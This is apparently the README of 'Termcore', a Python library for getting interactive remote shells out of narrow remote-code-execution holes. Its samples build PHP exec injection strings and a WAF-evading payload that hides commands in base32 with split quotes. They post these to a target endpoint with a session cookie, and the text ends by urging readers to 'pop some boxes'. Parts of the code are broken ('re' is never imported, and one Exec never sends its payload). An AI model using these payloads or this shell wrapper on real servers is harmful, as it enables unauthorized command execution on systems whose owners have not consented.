# Termcore

## Getting remote shells from narrow rce's


# Sample Uses

### Sample shell with hidden user *this is just a sample this is not by any means secure*

```py
from termcore import termcore
import os

class myTerm(termcore):
	def Exec(self, payload):
		os.system(payload)

	def customCommands(self, command, params):
		if command == 'whoami':
			print("That command is blacklisted")
			return True
		return False
		
term = myTerm("h", "kali")
```

### Sample shell From a RCE vulnerability (simple)

```py
from termcore import termcore
import os
import base64
import requests

url = 'http://example.com/vulnerable-page.php'

class myTerm(termcore):
	def preExec(self, command, params):
		return '; exec("' + command + " " + params + '")'

	def postExec(self,response):
	    response = re.sub(r"\<.*\>", "", response)
	    return response

	def Exec(self, payload):
		return requests.post(url).text

term = myTerm("www-data", "example.com")
```


### Sample shell From a RCE vulnerability and WAF bypass (advanced)

```py
from termcore import termcore
import os
import base64
import requests

sessid = 'S0m5S3SS10n1Dh3R3' 
url = 'http://example.com/remotecommands'
headers = {
	'Cookie' : 'session=' + sessid,
	'Content-Type': 'application/json'
}

class myTerm(termcore):
	def preExec(self, command, params):
		return "$(''base32 -''d <<< '" + str(base64.b32encode((command + " " + params).encode())) + "')"

	def postExec(self,response):
	    response = re.sub(r"\<.*\>", "", response)
	    return response

	def Exec(self, payload):
		return requests.post(url, data={'schedule': payload}, headers=headers).text

term = myTerm("www-data", "waffedexample.com")
```


# So, what to do?

Well, `import termcore from termcore`, override the stumps, pop some boxes.

## Stumps

### preExec(self, command, params):
> Gets whatever user has entered, and prepares and returns the payload.
> In an imaginary scenario where user needs to wrap their command in $ signs and user enters `ls -al`:
- command: ls
- params: -al
- should return: "$ " + command + " " + params + " $"

### Exec(self, payload):
> Get the payload executed, capture and return the raw response.

For example, 
- if you are just playing in your local, do `os.system(payload)`
- if you are on remote and need to send http request, your preExec should have your payload ready. Send it via requests.get/post
- if you need to send it to a socket on remote, use sockets to send the payload and get the response.

### postExec(self, response):
> Gets whatever response is returned from Exec, and cleans the output. Returns response from the user command.

So if RCE response is returned in as a cookie, get http response and only return the cookie.

If RCE response is returned in a div id="something", parse the html and return only the div innerhtml.

### cd(self, directory): (*OPTIONAL*)
> change working directory.

cd is implemented on the terminal, as it is with any terminal program. If you need to change directories, implement your own logic for it.

### customCommands(self,command, params): (*OPTIONAL*)
> Evaluated first before the Exec. Should return `True` if a custom command is being processed, and `False` if not.

